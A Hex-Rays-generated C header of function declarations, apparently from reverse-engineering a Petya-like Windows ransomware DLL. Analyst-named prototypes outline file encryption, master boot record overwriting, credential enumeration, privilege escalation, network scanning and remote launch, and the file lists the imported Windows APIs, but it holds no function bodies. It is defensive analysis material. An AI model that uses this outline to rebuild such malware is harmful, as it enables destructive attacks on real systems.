#pragma once
/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2017 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

LPVOID __stdcall CreateHeap(SIZE_T dwBytes);
void __stdcall FreeHeap(LPVOID lpMem);
int __stdcall GetSystemVolumes(void *); // idb
int __stdcall CreateSomeFiles(LPCSTR lpFileName, int); // idb
int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst); // idb
// int __userpurge CheckIfFileExists@<eax>(int a1@<eax>, LPCSTR lpFileName, LPCVOID lpBuffer);
int __stdcall CryptoAcquireContext(BYTE *pbBuffer, DWORD dwLen); // idb
int RunCryptWriteMBR();
HANDLE __stdcall WriteFileMapping(LPCWSTR lpFileName, int a2);
void __stdcall EnumerateFiles(LPCWSTR pszDir, int a2, int a3);
// BOOL __usercall CryptoGenerateKey@<eax>(int a1@<eax>);
BOOL __stdcall ImportPubKey(int a1);
// HLOCAL __usercall CryptoExportKey@<eax>(int a1@<eax>);
HLOCAL __stdcall GenerateReadMeMessage(LPCWSTR pszDir);
DWORD __stdcall CryptoCleanUp(LPVOID lpThreadParameter); // idb
_DWORD *CheckDriveAndPubKey();
bool __stdcall GetHeapAndMoveData(void *a1, size_t a2, void *Src, size_t Size, void *a5, size_t a6, int a7, int a8, void *a9, int a10, void *a11, int a12);
// int __usercall SockCloseConnection@<eax>(SOCKET *a1@<eax>);
BOOL __stdcall Dummy_StackSettup(__int64 a1);
signed int CheckIfTimePassed();
// BOOL __usercall GetAndFreeHeap@<eax>(BOOL *a1@<esi>);
// signed int __userpurge Unk_FindResourceAndIterate@<eax>(int a1@<esi>, __m64 mm0_0@<mm0>, __m64 mm1_0@<mm1>, _DWORD *a2, int a3, char a4);
// char __userpurge Unk_SockChecks@<al>(int a1@<eax>, unsigned __int16 a2);
// int __userpurge SockreceivData@<eax>(__int16 *a1@<esi>, SOCKET s, char a3, char a4);
_WORD *__stdcall Unk_SetIpAddress(__int16 a1, char a2, __int16 a3, __int16 a4, __int16 a5, __int16 a6, __int16 a7, __int16 a8);
char *__fastcall sub_681F24D0(int a1, _WORD *a2, void *Src);
// _WORD *__userpurge sub_681F2547@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, __int16 a5, _WORD *a6);
_BYTE *__stdcall Unk_ReturnByteArrayOfUnk_Exe(__int16 a1, __int16 a2, __int16 a3, __int16 a4, __int16 a5, _WORD *a6);
// _BYTE *__userpurge ProcessHeaps_1@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5);
// char *__userpurge CreateHeapAndMalloc@<eax>(_WORD *a1@<ecx>, unsigned __int16 a2@<di>, void *Src, char a4, __int16 a5, __int16 a6);
// _WORD *__userpurge sub_681F28B5@<eax>(char a1@<al>, __int16 a2, __int16 a3, __int16 a4, __int16 a5, BOOL a6, void *Src, _WORD *a8);
// _BYTE *__userpurge sub_681F29CE@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5);
// char *__userpurge sub_681F2ADF@<eax>(_WORD *a1@<eax>, __int16 a2@<dx>, __int16 a3@<cx>, char a4, char a5);
char *__fastcall sub_681F2C1E(__int16 cx0, __int16 dx0, int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, void *Src);
char *__thiscall sub_681F2CCF(void *this, int a2, int a3, void *Src, int a5);
_WORD *__thiscall sub_681F2D82(void *this, char a2);
// char *__userpurge sub_681F2E30@<eax>(_WORD *a1@<ebx>, unsigned __int16 a2@<di>, char a3, __int16 a4, void *Src);
// signed int __userpurge SockSendRecvDataFreeHeap@<eax>(SOCKET a1@<eax>, __int16 a2, LPVOID a3, int a4, _WORD *a5);
// signed int __userpurge SockProcessSendRecv_2@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5, LPVOID a6, char *a7, int a8, void *a9, _DWORD *a10, _WORD *a11);
// signed int __userpurge sub_681F3061@<eax>(SOCKET a1@<eax>, __int16 a2, _WORD *a3, LPVOID a4, int a5, char *a6);
int __stdcall SocketUseSocket1(SOCKET s, int, int, int, int, int); // idb
int __stdcall SocketUseSocket2(SOCKET s, int, int, int, int, int); // idb
int __stdcall sub_681F330E(SOCKET s, int, int, int, int, int, int, int, void *Src, int, int, int, int); // idb
int __stdcall sub_681F3469(SOCKET s, int, int, int, int, int, void *, void *Src, int); // idb
// signed int __userpurge sub_681F35FA@<eax>(SOCKET a1@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, __int16 a11);
// signed int __userpurge sub_681F369D@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, LPVOID a4, int a5, char *a6);
int __stdcall SockProcessSendRecv(SOCKET s, int, int, int, int, int, int, void *Src); // idb
// int __userpurge sub_681F3863@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, BOOL a8, BOOL a9, void *Src);
// int __userpurge sub_681F3986@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *a8, int a9, void *Src, int a11, int a12, int a13);
int __stdcall sub_681F3B5D(SOCKET s, int, int, int, int, int); // idb
int __stdcall sub_681F3C0A(SOCKET s, int, int, int, int, int); // idb
// signed int __userpurge sub_681F3CA0@<eax>(char a1@<al>, SOCKET a2);
int __stdcall CreateAndGetHeap(SOCKET s, int, int, int, int, int, int, int, int, int, int, int); // idb
// int __userpurge SocketProcessSocket_1@<eax>(char *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8);
// int __userpurge SocketProcessSocket_2@<eax>(_WORD *a1@<edi>, SOCKET s, int a3, int a4, int a5, int a6, int a7);
int __stdcall sub_681F42DF(SOCKET s, int, int, int, int, int, int); // idb
// signed int __userpurge sub_681F4820@<eax>(void *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
// int __userpurge sub_681F489C@<eax>(_WORD *a1@<eax>, _WORD *a2@<ecx>, SOCKET s, int a4, int a5, int a6, __int16 a7);
int __stdcall sub_681F4AFE(SOCKET s, int, int, int, int, int, int, void *Src, int, int, int, int); // idb
int __stdcall sub_681F4BA1(SOCKET s, int, int, int, int, int); // idb
// signed int __userpurge sub_681F4C1C@<eax>(int a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, __int64 a9, unsigned __int16 a10, _DWORD *a11, _WORD *a12);
// signed int __userpurge sub_681F4FB3@<eax>(int a1@<edx>, int a2@<esi>, __int64 a3);
// signed int __userpurge sub_681F501B@<eax>(int a1@<eax>, int a2@<ecx>, __int64 a3);
signed int __stdcall sub_681F50E0(SOCKET a1, int a2, int a3, int a4, int a5, int a6, __int64 a7, unsigned __int16 a8);
// signed int __userpurge sub_681F51F3@<eax>(int a1@<edi>, SOCKET a2, int a3, int a4, int a5, int a6);
// signed int __userpurge sub_681F5333@<eax>(int a1@<ebx>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *Src);
int __stdcall SocketUseSockets(int, SOCKET s, int, int, int, int, int); // idb
// int __userpurge sub_681F5A7E@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, char *cp, u_short hostshort, int a6, int a7, int a8, int a9, int a10, int a11, int a12);
// int __userpurge sub_681F668A@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, char *cp, int a4, int a5, int a6, int a7, int a8, int a9);
// int __userpurge SocketCreateAndConnect@<eax>(unsigned __int8 *a1@<ebx>, int a2, char *cp, u_short hostshort);
// int __userpurge SockGetData@<eax>(char **a1@<ebx>, __int16 *a2@<esi>, SOCKET s, char a4, int a5);
// int __userpurge SockSendBuffer@<eax>(SOCKET a1@<ebx>, char *buf, int len);
int __stdcall ConvertHeapMToWBytes(LPCSTR lpMultiByteStr); // idb
int ReturnTimeIfTimePassed();
// signed int __usercall CheckUsrArgs@<eax>(int a1@<eax>);
int __stdcall CheckCmdLineArgs(LPCWSTR lpCmdLine); // idb
int GeneratePath();
int __stdcall sub_681F6BB0(_WORD *a1);
signed int __stdcall CompareStringsW_2(int a1, int a2, int a3);
void __stdcall CleanUpHeaps_3(int a1);
int __stdcall CleanUpHeaps_2(void *Src, void *); // idb
int __stdcall CleanUpHeaps(void *Src, void *, int); // idb
BOOL __stdcall CompareStringsW(int a1, int a2, int a3);
// BOOL __userpurge LaunchCrit3@<eax>(int a1@<ebx>, struct _RTL_CRITICAL_SECTION *a2@<esi>, __int16 *a3);
_DWORD *__thiscall SomeHeapCleanupFunct(struct _RTL_CRITICAL_SECTION *this, __int16 *a2);
BOOL __stdcall EnumProcessHeap(LPVOID lpMem);
int __thiscall CheckCritSection(void *this, struct _RTL_CRITICAL_SECTION *a2, int *a3);
// int __userpurge sub_681F6FC7@<eax>(char *a1@<eax>, int a2@<esi>, struct _RTL_CRITICAL_SECTION *lpCriticalSection);
// void __usercall EnterAndLeaveCritSection_5(int a1@<esi>);
struct _RTL_CRITICAL_SECTION *__stdcall sub_681F7091(LONG a1, ULONG_PTR a2, _RTL_CRITICAL_SECTION_DEBUG *a3, LONG a4);
// signed int __usercall EnterAndLeaveCritSection_4@<eax>(int a1@<esi>);
// _DWORD *__userpurge GetHeapAndFreeIt@<eax>(struct _RTL_CRITICAL_SECTION *a1@<esi>, int a2, _DWORD *a3);
// signed int __userpurge EnterAndLeaveCritSection_3@<eax>(int a1@<ebx>, struct _RTL_CRITICAL_SECTION *a2@<esi>, _DWORD *a3);
// int __userpurge EnterAndLeaveCritSection_2@<eax>(unsigned int a1@<eax>, int a2@<esi>, int a3, _DWORD *a4);
// int __userpurge EnterAndLeaveCritSection@<eax>(struct _RTL_CRITICAL_SECTION *a1@<eax>, int *a2@<ebx>, int a3);
int __stdcall EnumerateProcessHeap(LPCRITICAL_SECTION lpCriticalSection, void *Src, int); // idb
// signed int __userpurge CreateFileAndWrite@<eax>(const WCHAR *a1@<ebx>, LPCWSTR lpFileName, LPCVOID lpBuffer);
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
// int __usercall Enum64BitProcessAndComPipes@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>);
BOOL __stdcall EnumNetIPProtocols(int a1);
int __stdcall EnumNetIpServices(int a1);
LPCWSTR __stdcall EnumNetServers(int a1, DWORD servertype, LPCWSTR domain);
int __stdcall EnumNetResources(int, LPNETRESOURCEW lpNetResource); // idb
int __stdcall EnumerateWindowsCredentials(int a1);
void __stdcall __noreturn GetPhysicalNetBiosAndWait(LPVOID lpThreadParameter);
bool __stdcall CompareMemoryAllocs(const void *a1, const void *a2, unsigned int a3);
void PerformPrivChecks();
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
DWORD __stdcall SetThreadParam(LPVOID lpThreadParameter); // idb
// signed int __userpurge SelfLocalHostCheck@<eax>(__m64 mm0_0@<mm0>, __m64 a2@<mm1>, const unsigned __int16 *a1);
// void __usercall __noreturn perfc_1(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread);
BOOL __stdcall CheckPrivsAdjustTokens(LPCWSTR lpName);
signed int FreeNetApiBuffer();
unsigned int *__stdcall GetNetServerInfo(int *a1, unsigned int *a2, unsigned int *a3, int *a4);
int __stdcall PathCombineWithCWindows(LPWSTR pszDest); // idb
BOOL SomeFileCheck();
// BOOL __userpurge LaunchCMDProcess@<eax>(int a1@<eax>, int a2);
signed int GetversionInfo();
BOOL CreateScheduledTaskAsAdmin();
// int __userpurge LoadAndLock@<eax>(void **a1@<ebx>, __m64 mm0_0@<mm0>, __m64 a3@<mm1>, int a2, HRSRC hResInfo);
int EnumerateProcesses();
unsigned int __stdcall EnumerateProcessesAndTokens(int a1);
// signed int __userpurge CreateSomeFile_2@<eax>(DWORD a1@<ebx>, const WCHAR *lpFileName, LPCVOID lpBuffer, DWORD NumberOfBytesWritten);
// signed int __userpurge GetDllHostData@<eax>(__m64 mm0_0@<mm0>, __m64 a2@<mm1>, int a1);
signed int CreateSomeFile();
signed int __stdcall FindFileByName(int a1);
signed int CheckSecurityAuthorityAndTokens();
signed int EnumPhysDriv0();
int SetLockAtCDir();
DWORD __stdcall Unk_ConvertIPAddress(LPVOID lpThreadParameter); // idb
DWORD __stdcall GetNetworkInterfaces(LPVOID lpThreadParameter); // idb
int __stdcall EnumerateHostNameAndIP_2(int a1);
signed int __thiscall sub_681F91FA(int this, int a2);
// int __userpurge CheckImageVProtect@<eax>(int a1@<esi>, LPVOID lpAddress);
unsigned int __thiscall sub_681F9322(int this, unsigned int a2);
BOOL LoadSomeLibraries();
// BOOL __userpurge CleanUp@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread);
int __stdcall SetVirtualAttributes(int a1, int a2, int a3);
int __stdcall EnumerateHostNameAndIP(char *name); // idb
// int __userpurge SetWideAddress@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPCWSTR lpWideCharStr, int a4, int a5);
// int __userpurge AcceptEulaAndLaunch@<eax>(WCHAR *a1@<ecx>, WCHAR *a2@<ebx>, int a3);
// signed int __userpurge InitRemoteLaunch@<eax>(WCHAR *a1@<ecx>, WCHAR *a2@<esi>, int a3, int a4, int a5);
BOOL __stdcall CheckUACPathsAndLaunchProcess(int a1, LPCWSTR lpUserName, LPCWSTR lpPassword, int a4);
// int __userpurge sub_681F9DC3@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPCWSTR lpWideCharStr);
// BOOL __userpurge sub_681F9E05@<eax>(struct _RTL_CRITICAL_SECTION *eax0@<eax>, int a1);
DWORD __stdcall LaunchChecksForAdminPaths(LPVOID lpThreadParameter); // idb
int __stdcall CreateAndHandleThread(int a1, int a2);
DWORD __stdcall sub_681F9F8E(LPVOID lpThreadParameter); // idb
DWORD __stdcall sub_681FA073(LPVOID lpThreadParameter); // idb
DWORD __stdcall sub_681FA0FE(LPVOID lpThreadParameter); // idb
// DWORD __userpurge SleepAndFreeHeap@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPVOID lpThreadParameter);
int __stdcall SockSendDataWithTimeOut(int, u_short hostshort); // idb
signed int __stdcall CheckIfDataWasSent(int a1);
// void *__cdecl memcpy(void *Dst, const void *Src, size_t Size);
// void __cdecl free(void *Memory);
// void *__cdecl malloc(size_t Size);
// char *__cdecl itoa(int Val, char *DstBuf, int Radix);
// void *__cdecl memset(void *Dst, int Val, size_t Size);
// void *__usercall _alloca_probe@<eax>(unsigned int a1@<eax>, int a2@<ecx>);
// signed int __userpurge SomeVersionCheck@<eax>(__m64 mm0_0@<mm0>, __m64 mm1_0@<mm1>, int a1, int *a2, int a3, int a4);
int __cdecl InsertCharsIntoBuffer(int a1);
// signed int __userpurge SomeCompressionFunct@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4);
signed int __stdcall sub_681FBA60(int a1);
signed int __stdcall sub_681FBAA4(int a1, signed int a2, _BYTE *a3, int a4);
signed int __stdcall sub_681FBB31(int a1, _BYTE *a2, int a3);
signed int __stdcall sub_681FBB48(int a1, signed int a2);
signed int __stdcall sub_681FBBBF(int a1);
signed int __stdcall sub_681FBBEA(int a1);
int __cdecl sub_681FBC5B(int, int, size_t Size); // idb
unsigned int __stdcall sub_681FBD21(unsigned int a1, _BYTE *a2, unsigned int a3);
unsigned int __stdcall sub_681FBF51(int a1, int a2, int a3);
unsigned int __cdecl sub_681FBF73(int a1, _BYTE *a2, unsigned int a3);
void *__cdecl ReturnMultipliedMalloc(int Unused, int X, int Y); // idb
void __cdecl FreeMemPtr(int unused, void *Memory); // idb
signed int __cdecl sub_681FC244(int a1, int a2, unsigned int a3, _DWORD **a4, unsigned int *a5, _WORD *a6);
// int __usercall sub_681FC6D0@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4);
// BOOL __stdcall CryptGenRandom(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// BOOL __stdcall CryptAcquireContextA(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// BOOL __stdcall CryptExportKey(HCRYPTKEY hKey, HCRYPTKEY hExpKey, DWORD dwBlobType, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
// BOOL __stdcall CryptAcquireContextW(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// BOOL __stdcall CreateProcessAsUserW(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// BOOL __stdcall InitiateSystemShutdownExW(LPWSTR lpMachineName, LPWSTR lpMessage, DWORD dwTimeout, BOOL bForceAppsClosed, BOOL bRebootAfterShutdown, DWORD dwReason);
// BOOL __stdcall DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
// BOOL __stdcall SetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
// BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// PUCHAR __stdcall GetSidSubAuthorityCount(PSID pSid);
// BOOL __stdcall OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// PDWORD __stdcall GetSidSubAuthority(PSID pSid, DWORD nSubAuthority);
// BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// BOOL __stdcall LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// BOOL __stdcall SetThreadToken(PHANDLE Thread, HANDLE Token);
// int __stdcall CredEnumerateW(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall CredFree(_DWORD); weak
// BOOL __stdcall SetSecurityDescriptorDacl(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted);
// BOOL __stdcall InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision);
// BOOL __stdcall CryptDestroyKey(HCRYPTKEY hKey);
// BOOL __stdcall CryptGenKey(HCRYPTPROV hProv, ALG_ID Algid, DWORD dwFlags, HCRYPTKEY *phKey);
// BOOL __stdcall CryptEncrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
// BOOL __stdcall CryptImportKey(HCRYPTPROV hProv, const BYTE *pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY *phKey);
// BOOL __stdcall CryptSetKeyParam(HCRYPTKEY hKey, DWORD dwParam, const BYTE *pbData, DWORD dwFlags);
// BOOL __stdcall CryptReleaseContext(HCRYPTPROV hProv, DWORD dwFlags);
// BOOL __stdcall CryptStringToBinaryW(LPCWSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
// BOOL __stdcall CryptBinaryToStringW(const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPWSTR pszString, DWORD *pcchString);
// BOOL __stdcall CryptDecodeObjectEx(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE *pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void *pvStructInfo, DWORD *pcbStructInfo);
// DWORD __stdcall DhcpEnumSubnetClients(WCHAR *ServerIpAddress, DHCP_IP_ADDRESS SubnetAddress, DHCP_RESUME_HANDLE *ResumeHandle, DWORD PreferredMaximum, LPDHCP_CLIENT_INFO_ARRAY *ClientInfo, DWORD *ClientsRead, DWORD *ClientsTotal);
// void __stdcall DhcpRpcFreeMemory(PVOID BufferPointer);
// DWORD __stdcall DhcpGetSubnetInfo(WCHAR *ServerIpAddress, DHCP_IP_ADDRESS SubnetAddress, LPDHCP_SUBNET_INFO *SubnetInfo);
// DWORD __stdcall DhcpEnumSubnets(WCHAR *ServerIpAddress, DHCP_RESUME_HANDLE *ResumeHandle, DWORD PreferredMaximum, LPDHCP_IP_ARRAY *EnumInfo, DWORD *ElementsRead, DWORD *ElementsTotal);
// ULONG __stdcall GetIpNetTable(PMIB_IPNETTABLE IpNetTable, PULONG SizePointer, BOOL Order);
// ULONG __stdcall GetAdaptersInfo(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);
// BOOL __stdcall ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
// HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName);
// HANDLE __stdcall CreateNamedPipeW(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwExitCode);
// BOOL __stdcall DisconnectNamedPipe(HANDLE hNamedPipe);
// BOOL __stdcall FlushFileBuffers(HANDLE hFile);
// DWORD __stdcall GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall DeleteFileW(LPCWSTR lpFileName);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName);
// BOOL __stdcall GetComputerNameExW(COMPUTER_NAME_FORMAT NameType, LPWSTR lpBuffer, LPDWORD nSize);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall GetVersionExW(LPOSVERSIONINFOW lpVersionInformation);
// DWORD __stdcall GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// BOOL __stdcall DisableThreadLibraryCalls(HMODULE hLibModule);
// DWORD __stdcall ResumeThread(HANDLE hThread);
// DWORD __stdcall GetEnvironmentVariableW(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// void __stdcall SetLastError(DWORD dwErrCode);
// HGLOBAL __stdcall LoadResource(HMODULE hModule, HRSRC hResInfo);
// HANDLE __stdcall GetCurrentThread();
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// UINT __stdcall GetSystemDirectoryW(LPWSTR lpBuffer, UINT uSize);
// DWORD __stdcall SizeofResource(HMODULE hModule, HRSRC hResInfo);
// void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime);
// BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// LPVOID __stdcall LockResource(HGLOBAL hResData);
// BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// LPWSTR __stdcall lstrcatW(LPWSTR lpString1, LPCWSTR lpString2);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
// BOOL __stdcall GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode);
// DWORD __stdcall WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// BOOL __stdcall CreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// BOOL __stdcall PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
// UINT __stdcall GetTempFileNameW(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
// LONG __stdcall InterlockedExchange(volatile LONG *Target, LONG Value);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetTickCount();
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// BOOL __stdcall FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// HANDLE __stdcall CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// BOOL __stdcall GetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// void __stdcall Sleep(DWORD dwMilliseconds);
// BOOL __stdcall FlushViewOfFile(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
// DWORD __stdcall GetLogicalDrives();
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// UINT __stdcall GetDriveTypeW(LPCWSTR lpRootPathName);
// BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress);
// LPVOID __stdcall MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// HANDLE __stdcall FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall DeviceIoControl(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
// DWORD __stdcall GetLastError();
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// HANDLE __stdcall GetProcessHeap();
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
